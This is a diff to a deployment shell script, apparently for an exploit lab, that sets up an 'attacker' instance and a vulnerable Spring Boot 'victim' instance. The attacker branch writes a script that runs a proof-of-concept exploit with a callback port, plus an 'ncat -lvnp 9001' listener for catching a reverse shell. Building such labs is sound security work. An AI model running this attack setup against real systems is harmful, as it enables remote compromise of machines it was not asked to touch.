@@ -4,6 +4,26 @@ if [ "$DEPLOYMENT_GROUP_NAME" == "AttackerDeployment" ]
 then
     cp -R /tmp/files/attacker /home/ec2-user
     rm -rf /tmp/files
+
+    source /home/ec2-user/venv/bin/activate
+
+    python -m pip install -r /home/ec2-user/attacker/requirements.txt
+
+    cd /home/ec2-user/attacker
+
+    SERVER_IP=$(curl https://checkip.amazonaws.com)
+
+    cat > ./start_attack.sh <<-EOF
+	python poc.py --userip ${SERVER_IP} --webport 8000 --lport 9001
+
+	EOF
+
+    cat > ./listen.sh <<-EOF
+	ncat -lvnp 9001
+
+	EOF
+
+    chmod -R 755 /home/ec2-user
 fi
 
 
@@ -12,6 +32,7 @@ then
     cp -R /tmp/files/victim /home/ec2-user
     rm -rf /tmp/files
 
+    # Configure httpd to serve spring boot application
     SERVER_IP=$(curl https://checkip.amazonaws.com)
 
     cat > /etc/httpd/conf.d/vhost.conf <<-EOF
@@ -24,4 +45,24 @@ then
 	</VirtualHost>
 
 	EOF
+
+    cd /home/ec2-user/victim
+
+    # Scripts to start and stop spring boot application
+    cat > ./start.sh <<-EOF
+	java -jar target/demo-0.0.1-SNAPSHOT.jar & echo $! > ./pid.file &
+
+	EOF
+
+    cat > ./stop.sh <<-EOF
+	kill $(cat ./pid.file)
+
+	EOF
+
+    cat > ./start_silent.sh <<-EOF
+	nohup ./start.sh > foo.out 2> foo.err < /dev/null &
+
+	EOF
+
+    chmod -R 755 /home/ec2-user
 fi
